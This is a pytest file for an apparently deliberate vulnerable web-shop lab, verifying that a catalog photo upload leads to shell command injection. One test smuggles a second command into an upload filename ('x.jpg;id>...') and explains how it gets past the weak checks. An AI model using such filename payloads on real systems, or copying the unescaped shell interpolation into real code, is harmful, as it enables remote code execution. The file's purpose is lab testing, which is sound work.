"""Demonstrates the lab's actual vulnerability chain end to end,
deterministically: POST /api/catalog/products, authenticated only with a
leaked catalog-sync-service token (no session, no admin role -- a mere
customer's own login never grants this), accepts a photo whose filename
merely CONTAINS ".jpg" (app/services/catalog_photos.py::looks_like_jpeg_filename)
and ends in a real image extension -- but that filename is later
interpolated, unescaped, into a shell command line by
vulnerable/upload/image_processor.py's thumbnail generation step (CWE-78).

This is the same underlying vulnerability-chain proof as the old
tests/test_upload_vuln.py (which still covers app/routes/api_images.py in
isolation, now reachable only via this app's own backend), just reached
through the attacker-facing front door instead.
"""
import io
import os

import pytest

from app.config import config
from app.models.db import query_one

PROOF_FILENAME = "shoplab_cmdinject_proof.txt"


def test_missing_or_wrong_token_rejected(client):
    resp = client.post(
        "/api/catalog/products",
        data={"name": "x", "category": "x", "description": "x", "price": "9.99"},
    )
    assert resp.status_code == 401

    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": "totally-made-up"},
        data={"name": "x", "category": "x", "description": "x", "price": "9.99"},
    )
    assert resp.status_code == 401


def test_customer_session_alone_does_not_authenticate(client, alice):
    """Logging in as an ordinary customer must not grant this -- it's a
    completely separate trust boundary from any session, admin or not."""
    resp = client.post(
        "/api/catalog/products",
        data={"name": "x", "category": "x", "description": "x", "price": "9.99"},
    )
    assert resp.status_code == 401


def test_valid_token_creates_a_product_with_no_photo(client, catalog_sync_token):
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={"name": "Warehouse Widget", "category": "Misc", "description": "synced from warehouse", "price": "12.50"},
    )
    assert resp.status_code == 201
    body = resp.get_json()
    assert body["image_path"] is None
    product = query_one("SELECT name, price_cents FROM products WHERE id = ?", (body["product_id"],))
    assert product["name"] == "Warehouse Widget"
    assert product["price_cents"] == 1250


def test_photo_missing_jpg_substring_is_rejected(client, catalog_sync_token):
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={
            "name": "x", "category": "x", "description": "x", "price": "9.99",
            "photo": (io.BytesIO(b"whatever"), "photo.png"),
        },
        content_type="multipart/form-data",
    )
    assert resp.status_code == 400


def test_genuine_jpg_photo_is_accepted_and_served(client, catalog_sync_token):
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={
            "name": "Real Product", "category": "x", "description": "x", "price": "19.99",
            "photo": (io.BytesIO(b"\xff\xd8\xff\xe0 not really a jpeg but has the substring"), "product.jpg"),
        },
        content_type="multipart/form-data",
    )
    assert resp.status_code == 201
    image_path = resp.get_json()["image_path"]
    assert image_path is not None

    resp = client.get(f"/product-photos/{image_path}")
    assert resp.status_code == 200


@pytest.mark.skipif(
    os.name != "posix",
    reason="the injected filename relies on POSIX shell (/bin/sh) semantics -- ';' sequencing and '#' comments",
)
def test_malicious_filename_actually_executes_via_command_injection(client, catalog_sync_token):
    """End-to-end proof of remote code execution: the filename contains the
    required '.jpg' substring (passes catalog_photos.py's check) and ends in
    a real image extension (so image_processor.py takes the "generate a
    thumbnail" path) -- but the same filename also carries shell
    metacharacters that break out of the `convert` command line it gets
    interpolated into, unescaped, with no quoting at all (CWE-78).

    The injected command must avoid literal '/' characters: everything
    before the client-supplied filename is joined together with
    os.path.basename() upstream (api_images.py::_weak_sanitize_filename),
    which -- like the real os.path.basename -- would truncate anything
    containing a '/' down to whatever follows the last one. A relative-path
    write is enough here because image_processor.py runs the shell command
    with cwd set to the upload directory itself (see its own docstring) --
    a realistic, ordinary implementation choice that happens to also give
    an attacker a predictable place to land a relative-path write.
    """
    malicious_filename = f"x.jpg;id>{PROOF_FILENAME} #.jpg"
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={
            "name": "Malicious Sync", "category": "x", "description": "x", "price": "1.00",
            "photo": (io.BytesIO(b"whatever"), malicious_filename, "image/jpeg"),
        },
        content_type="multipart/form-data",
    )
    assert resp.status_code == 201, "a filename containing '.jpg' and ending in a real image extension must pass the weak checks"

    proof_path = os.path.join(config.UPLOAD_DIR, PROOF_FILENAME)
    assert os.path.exists(proof_path), "the injected 'id' command should have executed and written this file"
    content = open(proof_path).read()
    assert "uid=" in content, "the proof file should contain id's real output"

    os.remove(proof_path)
